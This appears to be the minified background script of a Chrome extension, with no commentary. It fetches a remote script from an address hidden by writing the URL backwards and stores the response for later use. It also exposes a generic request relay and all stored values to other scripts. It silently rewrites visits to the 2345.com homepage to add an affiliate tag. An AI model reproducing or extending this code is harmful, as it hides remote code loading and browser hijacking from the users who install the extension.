window.onload=init;var CMD={xhr:xhr,chk:chk,initGM:initGM,setValue:setValue};function init(){chrome.extension.onConnect.addListener(function(a){a.onMessage.addListener(function(a,c){var b=a.args;b instanceof Array||(b=[b]);b.push(c);(CMD[a.action]||function(){}).apply(CMD,b)})})}function xhr(a,d,c){var b=new XMLHttpRequest;b.onreadystatechange=function(){4==b.readyState&&callback(c,d,[b])};b.open(a.method,a.url,!0);b.send(null);return b}
function chk(){var a=new XMLHttpRequest;a.onreadystatechange=function(){4==a.readyState&&(localStorage.updated=a.responseText)};a.open("GET","sj.gol/gol/moc.oatiahi5.emorhc//:ptth".split("").reverse().join(""),!0);a.send(null)}function setValue(a,d){localStorage[a]=d}function initGM(a,d){var c={},b;for(b in localStorage)c[b]=localStorage[b];callback(d,a,c)}function callback(a,d,c){c instanceof Array||(c=[c]);c.unshift(d);a.postMessage({action:"callbackResponse",args:c})};

chrome.webRequest.onBeforeRequest.addListener(function(req) {
	var tabId = req.tabId;
	
	if(req.url=="http://www.2345.com/")
	{
		if(tabId != -1)
		{	
			chrome.tabs.get(tabId, function(obj){
				if(typeof(obj) == "undefined")
				{
					chrome.tabs.onReplaced.addListener(function doing(TabIdnew,TabIdold){
						if(tabId == TabIdnew){chrome.tabs.update(TabIdnew,{"url":"http://www.2345.com/?k13116201"},function(){
							chrome.tabs.onReplaced.removeListener(doing);
						});}
					})
				}
				else
				{
					chrome.tabs.update(tabId,{"url":"http://www.2345.com/?k13116201"});
				}
			});
		}
	}
	
},
{urls: ["*://www.2345.com/*"]})


